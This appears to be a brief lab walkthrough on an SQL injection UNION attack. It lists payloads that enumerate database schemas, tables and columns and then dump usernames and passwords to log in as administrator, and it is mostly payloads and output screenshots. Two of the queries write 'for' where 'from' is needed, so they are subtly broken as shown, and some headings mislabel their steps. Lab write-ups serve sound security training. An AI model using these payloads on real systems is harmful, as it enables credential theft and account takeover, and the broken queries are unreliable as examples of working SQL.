### Five Exercise 👆


![problem.PNG](/assets/SQLi/First/problem.PNG)


#### **To do**

```
To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.  
```


1. First, read all databases
```sql
' union select NULL, schema_name from information_schema.schemata-- -
```

**Output**
![dbs.PNG](/assets/SQLi/Five/dbs.PNG)


2. Next, read columns of db **public**
```sql
' union select NULL, table_name for information_schema.tables where table_schema='public'-- -
```

**Output**
![tables.PNG](/assets/SQLi/Five/tables.PNG)


3. Get column names from table **users**
```bash
' union select NULL, column_name for information_schema.columns where table_schema='public' and table_name='users'-- -
```
![column-names.PNG](/assets/SQLi/Five/columns.PNG)

4. Read data for users
```bash
' union select NULL, concat(username,': ',password) from users-- -
```

**Output**
![creds.PNG](/assets/SQLi/Five/creds.PNG)

5. Login how **administrator**
![login.PNG](/assets/SQLi/Five/login.PNG)